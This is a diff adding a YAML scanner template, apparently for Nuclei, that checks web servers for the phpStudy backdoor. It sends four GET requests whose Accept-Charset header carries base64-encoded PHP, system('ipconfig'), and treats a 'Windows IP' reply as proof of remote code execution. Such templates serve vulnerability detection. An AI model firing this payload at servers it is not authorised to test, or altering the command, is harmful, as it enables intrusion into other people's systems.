@@ -1,0 +1,66 @@
+id: phpstudy-backdoor
+
+info:
+  name: phpstudy-backdoor
+  author: Natto97
+  severity: critical
+  description: phpstudy后门
+  reference: https://zhuanlan.zhihu.com/p/86181893
+  tags: rce
+
+requests:
+- raw:
+  - |
+    GET / HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: c3lzdGVtKCdpcGNvbmZpZycpOw==
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0, no-cache
+    Pragma: no-cache
+  - |
+    GET /l.php HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: c3lzdGVtKCdpcGNvbmZpZycpOw==
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0, no-cache
+    Pragma: no-cache
+  - |
+    GET /phpinfo.php HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: c3lzdGVtKCdpcGNvbmZpZycpOw==
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0, no-cache
+    Pragma: no-cache
+  - |
+    GET /index.php HTTP/1.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: c3lzdGVtKCdpcGNvbmZpZycpOw==
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0, no-cache
+    Pragma: no-cache
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Windows IP'
+  - type: status
+    status:
+    - 200
